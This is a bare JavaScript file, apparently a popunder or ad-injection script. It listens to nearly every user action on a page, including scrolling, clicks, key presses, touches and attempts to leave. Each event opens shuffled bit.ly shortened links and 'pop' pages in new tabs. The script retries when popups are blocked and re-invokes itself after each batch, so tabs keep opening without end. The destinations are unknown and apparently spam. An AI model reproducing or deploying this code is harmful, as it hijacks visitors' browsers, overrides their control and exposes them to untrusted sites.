function openRandomLinksRecursively(links, maxAttempts = 3) {
    const shuffledLinks = shuffleArray(links);
    let attempts = 0;

    function openLinks() {
        const maxTabs = Math.min(shuffledLinks.length, 4); // Limit to 4 tabs for safety
        let openedTabs = 0;

        for (let i = 0; i < maxTabs; i++) {
            const link = shuffledLinks[i];
            const newTab = window.open(link, '_blank');
            if (newTab === null || typeof newTab === 'undefined') {
                // Opening tab was blocked, retry
                attempts++;
                if (attempts <= maxAttempts) {
                    console.log(`Attempt ${attempts}: Failed to open ${link}. Retrying...`);
                    openLinks(); // Recursively retry opening links
                } else {
                    console.log(`Maximum attempts reached for ${link}.`);
                }
            } else {
                openedTabs++;
            }
        }

        if (openedTabs === maxTabs) {
            console.log(`Opened ${openedTabs} tabs.`);
            console.log("All links opened. Repeating script...");
            openRandomLinksRecursively(links, maxAttempts); // Repeat the script
        }
    }

    openLinks();
}

function shuffleArray(array) {
    for (let i = array.length - 1; i > 0; i--) {
        const j = Math.floor(Math.random() * (i + 1));
        [array[i], array[j]] = [array[j], array[i]];
    }
    return array;
}

var links = [
    'https://bit.ly/bangedfunflyer',
    'https://bit.ly/smashwatchunder',
    'https://bit.ly/smashwatchright',
    'https://bit.ly/bangedfunmaven',
    'https://bit.ly/smashwatchright',
    'https://bit.ly/bangedfundilla',
    'https://bit.ly/Bangedfunbid',
    'https://bit.ly/bangedfunmaven',
    'https://bit.ly/bangedfunrivernew',
    'https://bit.ly/bangedfunflyer',
    'https://bit.ly/bangedfunrivernew',
    'https://bit.ly/bangedfundilla',
    'https://bit.ly/smashwatchkada',
    'https://bit.ly/smashwatchkada',
    'https://bit.ly/Bangedfunbid',
    'https://www.smokeebash.com/2024/06/pop1.html',
    'https://www.smokeebash.com/2024/06/pop2.html',
];

function triggerOpenRandomLinksRecursively() {
    openRandomLinksRecursively(links); // Assuming links is accessible here
}

const events = [
    'scroll', 'keydown', 'click', 'mousewheel', 'touchstart', 'touchmove', 'touchend', 
    'beforeunload', 'unload', 'keypress'
];

events.forEach(event => {
    window.addEventListener(event, triggerOpenRandomLinksRecursively);
    document.addEventListener(event, triggerOpenRandomLinksRecursively);
});
